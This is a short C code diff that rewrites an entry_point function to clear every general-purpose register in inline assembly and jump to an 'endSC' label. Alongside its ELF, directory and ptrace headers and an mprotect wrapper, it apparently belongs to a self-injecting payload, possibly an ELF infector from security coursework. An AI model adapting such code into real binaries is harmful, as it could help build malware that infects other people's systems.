@@ -12,7 +12,6 @@ static void  start(void) {}
 #include <dirent.h>
 #include <elf.h>
 #include <bits/signum-generic.h>
-/* #include <sys/ptrace.h> */
 
 /* Architecture dependent */
 enum __ptrace_request {
@@ -54,22 +53,22 @@ int   entry_point(void *magic) {
   /*   return (1); */
   if (magic == (void *)0x42)
     return (0);
-  register int8_t rax2 asm("rax") = 0;
-  register int8_t rbx2 asm("rbx") = 0;
-  register int8_t rcx2 asm("rcx") = 0;
-  register int8_t rdx2 asm("rdx") = 0;
-  register int8_t rsi2 asm("rsi") = 0;
-  register int8_t rdi2 asm("rdi") = 0;
-  register int8_t r82 asm("r8") = 0;
-  register int8_t r92 asm("r9") = 0;
-  register int8_t r102 asm("r10") = 0;
-  register int8_t r112 asm("r11") = 0;
-  register int8_t r122 asm("r12") = 0;
-  register int8_t r132 asm("r13") = 0;
-  register int8_t r142 asm("r14") = 0;
-  register int8_t r152 asm("r15") = 0;
-  asm("leave");
-  asm("jmp endSC");
+  asm("mov $0, %rax\n\t"
+      "mov $0, %rbx\n\t"
+      "mov $0, %rcx\n\t"
+      "mov $0, %rdx\n\t"
+      "mov $0, %rsi\n\t"
+      "mov $0, %rdi\n\t"
+      "mov $0, %r8\n\t"
+      "mov $0, %r9\n\t"
+      "mov $0, %r10\n\t"
+      "mov $0, %r11\n\t"
+      "mov $0, %r12\n\t"
+      "mov $0, %r13\n\t"
+      "mov $0, %r14\n\t"
+      "mov $0, %r15\n\t"
+      "leave\n\t"
+      "jmp endSC");
 }
 
 static int  mprotect(void *addr, size_t len, int prot) {
